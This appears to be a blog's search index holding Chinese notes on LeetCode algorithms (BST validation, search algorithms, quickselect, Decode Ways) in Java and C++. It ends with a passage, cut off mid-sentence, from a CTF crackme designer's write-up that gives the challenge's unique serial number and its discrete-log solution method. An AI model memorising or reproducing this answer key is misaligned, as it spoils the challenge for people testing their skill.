\u548b\u4e00\u770b\u786e\u5b9e\u662f\u5bf9\u7684\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u662f\u9519\u7684\uff0c\u56e0\u4e3a\u8fd9\u91cc\u4e0d\u4ec5\u4ec5\u662f\u6bd4\u8f83\u7236\u8282\u70b9\u548c\u4e24\u4e2a\u5b50\u8282\u70b9\u5c31\u591f\u4e86 1 2 3 4 5 6 7 \u8f93\u5165: 10 / \\ 8 11 / \\ 7 13 \u8f93\u51fa: ? \u5f88\u660e\u663e\u5c31\u51fa\u9519\u4e86 \u6240\u4ee5\u9700\u8981\u8bb0\u5f55\u4e00\u4e0b\u4e0a\u4e0b\u754c\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 class TreeNode { int val ; TreeNode left ; TreeNode right ; TreeNode ( int x ){ val = x ;} } public class BST { //\u8bfb\u5165\u6570\u7ec4\uff0c\u5224\u65ad\u7ed9\u5b9a\u7684\u662f\u5426\u662f\u4e8c\u53c9\u641c\u7d22\u6811 /* @param node @param lower \u4fdd\u5b58\u6700\u5c0f\u7684\u6570 @param upper \u4fdd\u5b58\u6700\u5927\u7684\u6570\uff1f */ public boolean helper ( TreeNode node , Integer lower , Integer upper ) { if ( node == null ) return true ; int val = node . val ; if ( lower != null && val <= lower ) return false ; if ( upper != null && val >= upper ) return false ; if (! helper ( node . right , val , upper )) return false ; if (! helper ( node . left , lower , val )) return false ; return true ; } public boolean isValidBST ( TreeNode root ) { return helper ( root , null , null ); } } java Integer\u7c7b \u00b6 \u5176\u5b9e\u662f\u4e00\u4e2a int \u7684\u5305\u88c5\u7c7b\u4e86 Java\u4e2dInteger\u7c7b\u7684\u8be6\u89e3\u4e0e\u7528\u9014 \u4e0d\u7528\u9012\u5f52\u5b9e\u73b0 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 class Solution { LinkedList < TreeNode > stack = new LinkedList (); LinkedList < Integer > uppers = new LinkedList (), lowers = new LinkedList (); public void update ( TreeNode root , Integer lower , Integer upper ) { stack . add ( root ); lowers . add ( lower ); uppers . add ( upper ); } public boolean isValidBST ( TreeNode root ) { Integer lower = null , upper = null , val ; update ( root , lower , upper ); while (! stack . isEmpty ()) { root = stack . poll (); lower = lowers . poll (); upper = uppers . poll (); if ( root == null ) continue ; val = root . val ; if ( lower != null && val <= lower ) return false ; if ( upper != null && val >= upper ) return false ; update ( root . right , val , upper ); update ( root . left , lower , val ); } return true ; } } \u8fd9\u5c31\u6d89\u53ca\u5230\u5982\u4f55\u7528\u6808\u6765\u64cd\u4f5c\u4e86","title":"isValidBST"},{"location":"leetcode/isVaildBST/#isvalidbst","text":"","title":"isValidBST"},{"location":"leetcode/isVaildBST/#_1","text":"\u9057\u61be\u7684\u662f\u5982\u4f55\u5224\u65ad\u662f\u4e0d\u662f\u4e8c\u53c9\u6811\u90fd\u7ed9\u5fd8\u8bb0\u4e86 \u793a\u4f8b1\uff1a 1 2 3 4 5 \u8f93\u5165: 2 / \\ 1 3 \u8f93\u51fa: true \u4f46\u662f\u8fd9\u9898\u8fd8\u662f\u6709\u5751\u7684\uff0c\u5982\u679c\u5355\u7eaf\u5730\u76f4\u63a5\u7528\u9012\u5f52\u53bb\u505a\u80af\u5b9a\u662f\u51fa\u9519\u7684 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 //\u5bf9\u4e8e\u6bcf\u4e2a\u8282\u70b9\uff0c\u68c0\u6d4b\u5b83\u7684\u5de6\u5b69\u5b50\u8282\u70b9\u662f\u5426\u5c0f\u4e8e\u5b83\uff0c\u4e14\u53f3\u5b69\u5b50\u8282\u70b9\u662f\u5426\u5927\u4e8e\u5b83\u3002 bool isValidBST ( TreeNode * root ) { if ( root == NULL ) return true ; //\u5982\u679c\u5de6\u5b69\u5b50\u5927\u4e8e\u6839\u8282\u70b9\uff0c\u5219\u4e0d\u662fBST if ( root . left != NULL && root . left . val > root . val ) return false ; //\u5982\u679c\u53f3\u5b69\u5b50\u8282\u70b9\u5c0f\u4e8e\u6839\u8282\u70b9\uff0c\u5219\u4e0d\u662fBST if ( root . right != NULL && root . right . val < root . val ) return false ; //\u9012\u5f52\u7684\u5224\u65ad if (! isValidBST ( root . left ) || ! isValidBST ( root . right )) return false ; //BST return true ; } \u548b\u4e00\u770b\u786e\u5b9e\u662f\u5bf9\u7684\uff0c\u4f46\u662f\u5b9e\u9645\u4e0a\u662f\u9519\u7684\uff0c\u56e0\u4e3a\u8fd9\u91cc\u4e0d\u4ec5\u4ec5\u662f\u6bd4\u8f83\u7236\u8282\u70b9\u548c\u4e24\u4e2a\u5b50\u8282\u70b9\u5c31\u591f\u4e86 1 2 3 4 5 6 7 \u8f93\u5165: 10 / \\ 8 11 / \\ 7 13 \u8f93\u51fa: ? \u5f88\u660e\u663e\u5c31\u51fa\u9519\u4e86 \u6240\u4ee5\u9700\u8981\u8bb0\u5f55\u4e00\u4e0b\u4e0a\u4e0b\u754c\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 class TreeNode { int val ; TreeNode left ; TreeNode right ; TreeNode ( int x ){ val = x ;} } public class BST { //\u8bfb\u5165\u6570\u7ec4\uff0c\u5224\u65ad\u7ed9\u5b9a\u7684\u662f\u5426\u662f\u4e8c\u53c9\u641c\u7d22\u6811 /* @param node @param lower \u4fdd\u5b58\u6700\u5c0f\u7684\u6570 @param upper \u4fdd\u5b58\u6700\u5927\u7684\u6570\uff1f */ public boolean helper ( TreeNode node , Integer lower , Integer upper ) { if ( node == null ) return true ; int val = node . val ; if ( lower != null && val <= lower ) return false ; if ( upper != null && val >= upper ) return false ; if (! helper ( node . right , val , upper )) return false ; if (! helper ( node . left , lower , val )) return false ; return true ; } public boolean isValidBST ( TreeNode root ) { return helper ( root , null , null ); } }","title":"\u5206\u6790"},{"location":"leetcode/isVaildBST/#java-integer","text":"\u5176\u5b9e\u662f\u4e00\u4e2a int \u7684\u5305\u88c5\u7c7b\u4e86 Java\u4e2dInteger\u7c7b\u7684\u8be6\u89e3\u4e0e\u7528\u9014","title":"java Integer\u7c7b"},{"location":"leetcode/isVaildBST/#_2","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 class Solution { LinkedList < TreeNode > stack = new LinkedList (); LinkedList < Integer > uppers = new LinkedList (), lowers = new LinkedList (); public void update ( TreeNode root , Integer lower , Integer upper ) { stack . add ( root ); lowers . add ( lower ); uppers . add ( upper ); } public boolean isValidBST ( TreeNode root ) { Integer lower = null , upper = null , val ; update ( root , lower , upper ); while (! stack . isEmpty ()) { root = stack . poll (); lower = lowers . poll (); upper = uppers . poll (); if ( root == null ) continue ; val = root . val ; if ( lower != null && val <= lower ) return false ; if ( upper != null && val >= upper ) return false ; update ( root . right , val , upper ); update ( root . left , lower , val ); } return true ; } } \u8fd9\u5c31\u6d89\u53ca\u5230\u5982\u4f55\u7528\u6808\u6765\u64cd\u4f5c\u4e86","title":"\u4e0d\u7528\u9012\u5f52\u5b9e\u73b0"},{"location":"leetcode/java\u7684\u4e00\u4e9b\u5751/","text":"java\u7684\u4e00\u4e9b\u5751 \u00b6 \u867d\u7136java\u4e5f\u7528\u4e86\u5f88\u4e45\u4e86\uff0c\u4f46\u662f\u6bd5\u7adf\u5f88\u957f\u65f6\u95f4\u6ca1\u5199\u4e86\uff0c\u73b0\u5728\u4ece\u5934\u5f00\u59cb\u5199\u8d77\u6765\u53c8\u53d1\u73b0\u4e86\u4e00\u4e9b\u95ee\u9898 \u4f20\u503c\u8fd8\u662f\u4f20\u5f15\u7528 \u00b6 \u8fd9\u4e2a\u95ee\u9898\u5176\u5b9e\u5728java\u4e2d\u7b97\u662f\u5f88\u5e38\u89c1\u7684\u95ee\u9898\u4e86\uff0c\u6bd4\u5982\u8fd9\u4e2a\uff1a 1 \u5176\u4e2d insertBST \u51fd\u6570\u4e2d\u4f20\u5165\u7684\u662f this.Root \uff0c\u4f46\u662f\u8fd9\u91cc\u5e76\u4e0d\u4f1a\u6539\u53d8\u5916\u90e8\u7684\u7684 this.Root \uff01","title":"java\u7684\u4e00\u4e9b\u5751"},{"location":"leetcode/java\u7684\u4e00\u4e9b\u5751/#java","text":"\u867d\u7136java\u4e5f\u7528\u4e86\u5f88\u4e45\u4e86\uff0c\u4f46\u662f\u6bd5\u7adf\u5f88\u957f\u65f6\u95f4\u6ca1\u5199\u4e86\uff0c\u73b0\u5728\u4ece\u5934\u5f00\u59cb\u5199\u8d77\u6765\u53c8\u53d1\u73b0\u4e86\u4e00\u4e9b\u95ee\u9898","title":"java\u7684\u4e00\u4e9b\u5751"},{"location":"leetcode/java\u7684\u4e00\u4e9b\u5751/#_1","text":"\u8fd9\u4e2a\u95ee\u9898\u5176\u5b9e\u5728java\u4e2d\u7b97\u662f\u5f88\u5e38\u89c1\u7684\u95ee\u9898\u4e86\uff0c\u6bd4\u5982\u8fd9\u4e2a\uff1a 1 \u5176\u4e2d insertBST \u51fd\u6570\u4e2d\u4f20\u5165\u7684\u662f this.Root \uff0c\u4f46\u662f\u8fd9\u91cc\u5e76\u4e0d\u4f1a\u6539\u53d8\u5916\u90e8\u7684\u7684 this.Root \uff01","title":"\u4f20\u503c\u8fd8\u662f\u4f20\u5f15\u7528"},{"location":"leetcode/\u5e38\u7528\u7684\u67e5\u627e\u7b97\u6cd5/","text":"\u5e38\u7528\u7684\u67e5\u627e\u7b97\u6cd5 \u00b6 \u63d2\u503c\u67e5\u627e \u00b6 \u5982\u679c\u6211\u4eec\u8981\u67e5\u627e\u5355\u8bcdprontosil,\u80af\u5b9a\u4e0d\u4f1a\u662f\u7528\u4e8c\u5206\u67e5\u627e\u7684\u65b9\u6cd5\uff0c\u5148\u7ffb\u5230\u5b57\u5178\u7684\u4e2d\u95f4\uff0c\u7136\u540e\u518d\u7ffb\u5230\u00be\u5904\uff0c\u800c\u662f\u4e00\u5f00\u59cb\u5c31\u4f1a\u627e\u5230\u5b57\u6bcdp\u6240\u5728\u7684\u4f4d\u7f6e\u5f00\u59cb\u67e5\u627e\uff0c\u63d2\u503c\u67e5\u627e\u7684\u539f\u7406\u4e0e\u6b64\u7c7b\u4f3c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public static int find ( int array [], int key ){ int start = 0 , end = ( array . length - 1 ); while ( start <= end && key >= array [ start ] && key <= array [ end ]){ int pos = start + (( end - start ) /( array [ end ] - array [ start ]) * ( key - array [ start ])); if ( array [ pos ] == key ){ return pos ; } if ( array [ pos ] < key ){ start = pos + 1 ; } else { end = pos - 1 ; } } return - 1 ; } \u91cd\u70b9\u662f pos \u503c\u7684\u8ba1\u7b97\uff0c\u8fd9\u5f20\u56fe\u4e0d\u77e5\u9053\u80fd\u4e0d\u80fd\u7406\u89e3\uff1a \u4e0d\u8fc7\u8fd9\u79cd\u7b97\u6cd5\u8981\u5047\u5b9a\u6570\u636e\u4e0d\u4ec5\u662f\u5df2\u88ab\u6392\u597d\u5e8f\u7684\uff0c\u800c\u4e14\u5448\u73b0\u5747\u5300\u5206\u5e03\u7279\u5f81\u3002 \u4e8c\u53c9\u641c\u7d22\u6811 \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public TreeNode find ( int value ){ TreeNode current = Root ; while ( current != null ){ if ( value < current . val ){ if ( current . left == null ){ return null ; } current = current . left ; } else if ( value > current . val ){ if ( current . right == null ){ return null ; } current = current . right ; } else { return current ; } } return null ; } Ternary Search \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public int ternarySearch ( Integer [] arr , Integer key , int start , int end ){ if ( start > end ){ return - 1 ; } int mid1 = start + ( end - start ) / 3 ; int mid2 = start + 2 *( end - start )/ 3 ; if ( key . compareTo ( arr [ mid1 ]) == 0 ){ return mid1 ; } else if ( key . compareTo ( arr [ mid2 ]) == 0 ){ return mid2 ; } else if ( key . compareTo ( arr [ mid1 ]) < 0 ){ return ternarySearch ( arr , key , start , -- mid1 ); } else if ( key . compareTo ( arr [ mid2 ]) > 0 ){ return ternarySearch ( arr , key , ++ mid2 , end ); } else { return ternarySearch ( arr , key , mid1 , mid2 ); } } \u8fd9\u4e2a\u7b97\u6cd5\u5176\u5b9e\u4e5f\u8981\u5047\u5b9a\u6570\u636e\u662f\u6392\u597d\u5e8f\u7684 \u4e3e\u4f8b\uff1a 1 2 3 4 int[] array = {2,3,5,6,8,9,12,13,14}; //\u7b2c\u4e00\u6b21\u5206\u5272 {2,3,5} {6,8,9} {12,13,14} mid1 = 3, mid2 = 6 \u6b64\u65f6key=13 > 12 //\u7b2c\u4e8c\u6b21\u5206\u5272 mid1 = 7 mid2 = 8 \u6b64\u65f6array[mid1] = 13 Quick select \u00b6 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 //\u5bfb\u627e\u7b2ck\u4e2a\u6700\u5c0f\u7684\u5143\u7d20 public int quickSelect ( int [] nums , int k , int start , int end ) { //\u968f\u673a\u9009\u62e9\u4e00\u4e2a\u6570 Random rand = new Random (); int index = rand . nextInt ( end - start + 1 ) + start ; int pivot = nums [ index ]; swap ( nums , index , end ); int left = start , right = end ; while ( left < right ) { if ( nums [ left ++] >= pivot ) { swap ( nums , -- left , -- right ); } } //left is now pointing to the first number that is greater than or equal to the pivot swap ( nums , left , end ); //m \u4ee3\u8868\u6709\u591a\u5c11\u4e2a\u5c0f\u4e8epivot\u7684\u6570 int m = left - start ; if ( m == k - 1 ) { //\u5bfb\u627e\u7b2ck\u4e2a\u6700\u5c0f\u7684\u6570 return pivot ; } else if ( k <= m ) { //\u76ee\u6807\u5728\u5de6\u8fb9\u7684\u5b50\u6570\u5217 return quickSelect ( nums , k , start , left - 1 ); } else { //\u76ee\u6807\u5728\u53f3\u8fb9\u7684\u5b50\u6570\u5217\uff0c\u4f46\u662f\u8981\u66f4\u65b0k return quickSelect ( nums , k - m , left , end ); } } \u7b97\u6cd5\u7684\u63cf\u8ff0\uff1a \u4ece\u6570\u7ec4\u9009\u62e9\u4e00\u4e2a\u5c5e\u4f5c\u4e3apivot,\u4ea4\u6362pivot\u548c\u6570\u7ec4\u6700\u540e\u4e00\u4e2a\u6570\u7684\u4f4d\u7f6e \u968f\u673a\u7684pivot\u6709\u5229\u4e8e\u7b97\u6cd5\u8fd0\u884c\u5728\u5e73\u5747\u7684\u65f6\u95f4\u590d\u6742\u5ea6 \u5c06\u6570\u7ec4\u5206\u6210\u4e24\u534a\uff0c\u5de6\u8fb9\u7684\u90fd\u5c0f\u4e8e\u7b49\u4e8epivot\u53f3\u8fb9\u7684\u90fd\u5927\u4e8e\u7b49\u4e8epivot \u7136\u540ek\u4e0e\u5de6\u8fb9\u7684\u6570\u7ec4\u957f\u5ea6\u6bd4\u8f83\uff0c\u5982\u679c k = len + 1 pivot\u5c31\u662f\u8981\u627e\u7684 k <= len \u4ece\u5de6\u8fb9\u6570\u7ec4\u9012\u5f52 k > len \u66f4\u65b0k = k -len \u4ece\u53f3\u8fb9\u6570\u7ec4\u9012\u5f52","title":"\u5e38\u7528\u7684\u67e5\u627e\u7b97\u6cd5"},{"location":"leetcode/\u5e38\u7528\u7684\u67e5\u627e\u7b97\u6cd5/#_1","text":"","title":"\u5e38\u7528\u7684\u67e5\u627e\u7b97\u6cd5"},{"location":"leetcode/\u5e38\u7528\u7684\u67e5\u627e\u7b97\u6cd5/#_2","text":"\u5982\u679c\u6211\u4eec\u8981\u67e5\u627e\u5355\u8bcdprontosil,\u80af\u5b9a\u4e0d\u4f1a\u662f\u7528\u4e8c\u5206\u67e5\u627e\u7684\u65b9\u6cd5\uff0c\u5148\u7ffb\u5230\u5b57\u5178\u7684\u4e2d\u95f4\uff0c\u7136\u540e\u518d\u7ffb\u5230\u00be\u5904\uff0c\u800c\u662f\u4e00\u5f00\u59cb\u5c31\u4f1a\u627e\u5230\u5b57\u6bcdp\u6240\u5728\u7684\u4f4d\u7f6e\u5f00\u59cb\u67e5\u627e\uff0c\u63d2\u503c\u67e5\u627e\u7684\u539f\u7406\u4e0e\u6b64\u7c7b\u4f3c 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 public static int find ( int array [], int key ){ int start = 0 , end = ( array . length - 1 ); while ( start <= end && key >= array [ start ] && key <= array [ end ]){ int pos = start + (( end - start ) /( array [ end ] - array [ start ]) * ( key - array [ start ])); if ( array [ pos ] == key ){ return pos ; } if ( array [ pos ] < key ){ start = pos + 1 ; } else { end = pos - 1 ; } } return - 1 ; } \u91cd\u70b9\u662f pos \u503c\u7684\u8ba1\u7b97\uff0c\u8fd9\u5f20\u56fe\u4e0d\u77e5\u9053\u80fd\u4e0d\u80fd\u7406\u89e3\uff1a \u4e0d\u8fc7\u8fd9\u79cd\u7b97\u6cd5\u8981\u5047\u5b9a\u6570\u636e\u4e0d\u4ec5\u662f\u5df2\u88ab\u6392\u597d\u5e8f\u7684\uff0c\u800c\u4e14\u5448\u73b0\u5747\u5300\u5206\u5e03\u7279\u5f81\u3002","title":"\u63d2\u503c\u67e5\u627e"},{"location":"leetcode/\u5e38\u7528\u7684\u67e5\u627e\u7b97\u6cd5/#_3","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 public TreeNode find ( int value ){ TreeNode current = Root ; while ( current != null ){ if ( value < current . val ){ if ( current . left == null ){ return null ; } current = current . left ; } else if ( value > current . val ){ if ( current . right == null ){ return null ; } current = current . right ; } else { return current ; } } return null ; }","title":"\u4e8c\u53c9\u641c\u7d22\u6811"},{"location":"leetcode/\u5e38\u7528\u7684\u67e5\u627e\u7b97\u6cd5/#ternary-search","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 public int ternarySearch ( Integer [] arr , Integer key , int start , int end ){ if ( start > end ){ return - 1 ; } int mid1 = start + ( end - start ) / 3 ; int mid2 = start + 2 *( end - start )/ 3 ; if ( key . compareTo ( arr [ mid1 ]) == 0 ){ return mid1 ; } else if ( key . compareTo ( arr [ mid2 ]) == 0 ){ return mid2 ; } else if ( key . compareTo ( arr [ mid1 ]) < 0 ){ return ternarySearch ( arr , key , start , -- mid1 ); } else if ( key . compareTo ( arr [ mid2 ]) > 0 ){ return ternarySearch ( arr , key , ++ mid2 , end ); } else { return ternarySearch ( arr , key , mid1 , mid2 ); } } \u8fd9\u4e2a\u7b97\u6cd5\u5176\u5b9e\u4e5f\u8981\u5047\u5b9a\u6570\u636e\u662f\u6392\u597d\u5e8f\u7684 \u4e3e\u4f8b\uff1a 1 2 3 4 int[] array = {2,3,5,6,8,9,12,13,14}; //\u7b2c\u4e00\u6b21\u5206\u5272 {2,3,5} {6,8,9} {12,13,14} mid1 = 3, mid2 = 6 \u6b64\u65f6key=13 > 12 //\u7b2c\u4e8c\u6b21\u5206\u5272 mid1 = 7 mid2 = 8 \u6b64\u65f6array[mid1] = 13","title":"Ternary Search"},{"location":"leetcode/\u5e38\u7528\u7684\u67e5\u627e\u7b97\u6cd5/#quick-select","text":"1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 //\u5bfb\u627e\u7b2ck\u4e2a\u6700\u5c0f\u7684\u5143\u7d20 public int quickSelect ( int [] nums , int k , int start , int end ) { //\u968f\u673a\u9009\u62e9\u4e00\u4e2a\u6570 Random rand = new Random (); int index = rand . nextInt ( end - start + 1 ) + start ; int pivot = nums [ index ]; swap ( nums , index , end ); int left = start , right = end ; while ( left < right ) { if ( nums [ left ++] >= pivot ) { swap ( nums , -- left , -- right ); } } //left is now pointing to the first number that is greater than or equal to the pivot swap ( nums , left , end ); //m \u4ee3\u8868\u6709\u591a\u5c11\u4e2a\u5c0f\u4e8epivot\u7684\u6570 int m = left - start ; if ( m == k - 1 ) { //\u5bfb\u627e\u7b2ck\u4e2a\u6700\u5c0f\u7684\u6570 return pivot ; } else if ( k <= m ) { //\u76ee\u6807\u5728\u5de6\u8fb9\u7684\u5b50\u6570\u5217 return quickSelect ( nums , k , start , left - 1 ); } else { //\u76ee\u6807\u5728\u53f3\u8fb9\u7684\u5b50\u6570\u5217\uff0c\u4f46\u662f\u8981\u66f4\u65b0k return quickSelect ( nums , k - m , left , end ); } } \u7b97\u6cd5\u7684\u63cf\u8ff0\uff1a \u4ece\u6570\u7ec4\u9009\u62e9\u4e00\u4e2a\u5c5e\u4f5c\u4e3apivot,\u4ea4\u6362pivot\u548c\u6570\u7ec4\u6700\u540e\u4e00\u4e2a\u6570\u7684\u4f4d\u7f6e \u968f\u673a\u7684pivot\u6709\u5229\u4e8e\u7b97\u6cd5\u8fd0\u884c\u5728\u5e73\u5747\u7684\u65f6\u95f4\u590d\u6742\u5ea6 \u5c06\u6570\u7ec4\u5206\u6210\u4e24\u534a\uff0c\u5de6\u8fb9\u7684\u90fd\u5c0f\u4e8e\u7b49\u4e8epivot\u53f3\u8fb9\u7684\u90fd\u5927\u4e8e\u7b49\u4e8epivot \u7136\u540ek\u4e0e\u5de6\u8fb9\u7684\u6570\u7ec4\u957f\u5ea6\u6bd4\u8f83\uff0c\u5982\u679c k = len + 1 pivot\u5c31\u662f\u8981\u627e\u7684 k <= len \u4ece\u5de6\u8fb9\u6570\u7ec4\u9012\u5f52 k > len \u66f4\u65b0k = k -len \u4ece\u53f3\u8fb9\u6570\u7ec4\u9012\u5f52","title":"Quick select"},{"location":"leetcode/\u89e3\u7801\u65b9\u6cd591/","text":"\u89e3\u7801\u65b9\u6cd5\u2014\u201491 \u00b6 1 \u5982\u679c\u8f93\u5165 1 2 3 4 5 12 \u5219\u53ef\u80fd\u6709\u4e24\u79cd\u89e3\u7801\u60c5\u51b5\uff0c1\uff0c2\u6216\u8005 12 \u4f46\u662f\u8f93\u516510 \u5219\u53ea\u6709\u4e00\u79cd\u89e3\u7801\u60c5\u51b5 \u52a8\u6001\u89c4\u5212 \u00b6 1 2 3 4 5 6 7 8 9 \u8bbe dp[i] \u4e3a s[0..i]\u7684\u6240\u6709\u60c5\u51b5 1. s[i] = '0' && s[i-1] = '1' or '2' \u90a3\u4e48dp[i] = s[i-2] \u56e0\u4e3a s[i-1]s[i]\u53ea\u6709\u4e00\u79cd\u60c5\u51b5 \u5426\u5219return 0 \u8fd9\u91cc\u6709\u70b9\u4e0d\u592a\u61c2 2. s[i-1] = '1' dp[i] = dp[i-1] + dp[i-2] 3. \u82e5s[i-1] = '2' \u5e76\u4e14 '1'<=s[i]<='6' \u90a3\u4e48dp[i] = dp[i-1] + dp[i-2] \u6545\u6709\u5982\u4e0b\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 int numDecodings ( string s ) { if ( s [ 0 ] == '0' ) return 0 ; int pre = 1 , curr = 1 ; //dp[-1] = dp[0] = 1 for ( int i = 1 ; i < s . size (); i ++ ) { int tmp = curr ; if ( s [ i ] == '0' ) if ( s [ i - 1 ] == '1' || s [ i - 1 ] == '2' ) curr = pre ; else return 0 ; else if ( s [ i - 1 ] == '1' || ( s [ i - 1 ] == '2' && s [ i ] >= '1' && s [ i ] <= '6' )) curr = curr + pre ; pre = tmp ; } return curr ; }","title":"\u89e3\u7801\u65b9\u6cd5\u2014\u201491"},{"location":"leetcode/\u89e3\u7801\u65b9\u6cd591/#91","text":"1 \u5982\u679c\u8f93\u5165 1 2 3 4 5 12 \u5219\u53ef\u80fd\u6709\u4e24\u79cd\u89e3\u7801\u60c5\u51b5\uff0c1\uff0c2\u6216\u8005 12 \u4f46\u662f\u8f93\u516510 \u5219\u53ea\u6709\u4e00\u79cd\u89e3\u7801\u60c5\u51b5","title":"\u89e3\u7801\u65b9\u6cd5\u2014\u201491"},{"location":"leetcode/\u89e3\u7801\u65b9\u6cd591/#_1","text":"1 2 3 4 5 6 7 8 9 \u8bbe dp[i] \u4e3a s[0..i]\u7684\u6240\u6709\u60c5\u51b5 1. s[i] = '0' && s[i-1] = '1' or '2' \u90a3\u4e48dp[i] = s[i-2] \u56e0\u4e3a s[i-1]s[i]\u53ea\u6709\u4e00\u79cd\u60c5\u51b5 \u5426\u5219return 0 \u8fd9\u91cc\u6709\u70b9\u4e0d\u592a\u61c2 2. s[i-1] = '1' dp[i] = dp[i-1] + dp[i-2] 3. \u82e5s[i-1] = '2' \u5e76\u4e14 '1'<=s[i]<='6' \u90a3\u4e48dp[i] = dp[i-1] + dp[i-2] \u6545\u6709\u5982\u4e0b\u4ee3\u7801\uff1a 1 2 3 4 5 6 7 8 9 10 11 12 13 14 int numDecodings ( string s ) { if ( s [ 0 ] == '0' ) return 0 ; int pre = 1 , curr = 1 ; //dp[-1] = dp[0] = 1 for ( int i = 1 ; i < s . size (); i ++ ) { int tmp = curr ; if ( s [ i ] == '0' ) if ( s [ i - 1 ] == '1' || s [ i - 1 ] == '2' ) curr = pre ; else return 0 ; else if ( s [ i - 1 ] == '1' || ( s [ i - 1 ] == '2' && s [ i ] >= '1' && s [ i ] <= '6' )) curr = curr + pre ; pre = tmp ; } return curr ; }","title":"\u52a8\u6001\u89c4\u5212"},{"location":"reverse/CTF 2019Q2 readyu crackme/","text":"CTF 2019Q2 readyu crackme \u51fa\u9898\u601d\u8def \u00b6 (1) \u5e8f\u5217\u53f7 \u672c\u9898\u552f\u4e00\u5e8f\u5217\u53f7SN\u4e3a\uff1a KCTFREADYKXXXX1548396171915056368526513804948765619094392315806578461796159505215278288254 (2) \u65b9\u7a0b \u7b97\u6cd5\u57fa\u4e8e\u4e8c\u6b21\u5269\u4f59\u4e0e\u79bb\u6563\u5bf9\u6570\uff0c \u5efa\u7acb\u4e862\u4e2a\u65b9\u7a0b (1) (2) \u89c1\u4e0b\u6587\u3002\u5e76\u4e14\u6a21\u540c\u4e00\u4e2a\u7d20\u6570\u3002\u6240\u4ee5\u6682\u5b9a\u53d6\u540d \u201c\u4e00\u77f3\u4e8c\u9e1f\u201d\u3002 P=2^255-19 \u662f\u4e00\u4e2a\u7d20\u6570, base16 \u6216\u8005base10\u5982\u4e0b\uff1a P(hex)=7FFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFED P(dec)=57896044618658097711785492504343953926634992332820282019728792003956564819949 \u5e8f\u5217\u53f7\u683c\u5f0f\u4e3a\u4e24\u6bb5\u5b57\u7b26\uff0c + \u8868\u793a\u5b57\u7b26\u4e32\u5408\u5e76\uff1a SN = \u201cs1\u201d + \u201cXXXX\u201d + \u201cs2\u201d s1\u662f\u5927\u5199\u5b57\u6bcd\u4e32\uff0c s2\u662f\u5341\u8fdb\u5236\u6570\u5b57\u4e32\u3002 \u6570\u503c\u4e0a\uff0c 1 < s1, s2 < P \u5176\u4e2d, s1,s2 \u662f\u672a\u77e5\u91cf\uff0c d\u662fs1\u53d8\u6362\u800c\u6765\u7684\u672a\u77e5\u91cf\u3002 s1\u9006\u5e8f\u53d8\u6362\uff0c\u52a0\u4e0a\u6700\u5c0f\u4f4d\u8c03\u6574\uff0c \u7136\u540ebase25\u89e3\u7801\u5f97\u5230d. (Y,G)\u5185\u7f6e\u4e8e\u7a0b\u5e8f\u4e4b\u4e2d\u3002 64*(s2-s1)^4 + (s2-s1)^2 + 3 = s1 mod P ... (1) G^d = Y mod P ... (2) G,Y \u662f\u5df2\u77e5\u6570, \u8303\u56f4 [ 1, P-1]: Y = 100 G = 9230197858975018299629857977411527954550899478307510809210520967346958600039 (3) \u89e3\u6cd5 \u89e3\u6cd5\uff1a\u9996\u5148\u89e3\u65b9\u7a0b2\uff0c \u5f97\u5230d \uff0c \u8f6c\u6362\u4e3as1 \uff1b \u7136\u540e\u518d\u89e3\u65b9\u7a0b1 \u5f97\u5230s2\u3002 (3.1) \u89e3\u65b9\u7a0b(2) \u65b9\u7a0b(2)\u89e3\u91ca\u5982\u4e0b\uff1a d = base25.reverse(s1) ....(3) \u968f\u673a\u9a8c\u8bc1\u4efb\u4f55\u4e00\u5bf9\uff0c\u7ed3\u679c\u90fd\u662f\u4e00\u6837\u7684\u3002 (Y,G) = 1 2 3 4 5 6 7 \"100,9230197858975018299629857977411527954550899478307510809210520967346958600039\", \"101,50414221767352083765613498524674590844333823720255656432490557866777248860034\", \"102,38377684164112914669201831650756813551072223314592288217929947158283532270268\", \"103,13436195533519778671648120865743178010431697022400670384909515001970400645091\", \u6bd4\u5982 Y=100, 1 G=9230197858975018299629857977411527954550899478307510809210520967346958600039 G^d = Y mod P , P\u662f256bit\u7684\u5927\u7d20\u6570\u3002 \u8868\u9762\u4e00\u770b\uff0c\u9700\u8981\u89e3256 bit\u7684\u79bb\u6563\u5bf9\u6570\uff0c \u9700\u8981\u89e3\u79bb\u6563\u5bf9\u6570\u5de5\u5177\uff0c\u6bd4\u5982gdlog\u3002 GDLOG Implementation of the GNFS for discrete logarithm problem in GF(p) https://sourceforge.net/projects/gdlog/ \u4f46\u672c\u9898\uff0c\u7a0b\u5e8f\u91cc\u7ed9\u51fa\u4e86\u6761\u4ef6\uff0c d \u8f6c\u5316\u4e3abase25\u5b57\u7b26\u65f6\uff0c\u6700\u957f\u4e3a10\u4e2a\u5b57\u8282\u3002 \u6240\u4ee5\u6570\u91cf\u7ea7\u6781\u5927\u5730\u7f29\u5c0f\uff0c \u53ea\u670947bits\u3002 \u4e5f\u5c31\u662fd < limit, limit = 25^10 = 95367431640625 \u3002 \u56e0\u6b64\uff0c\u7528 pollard kangaroo 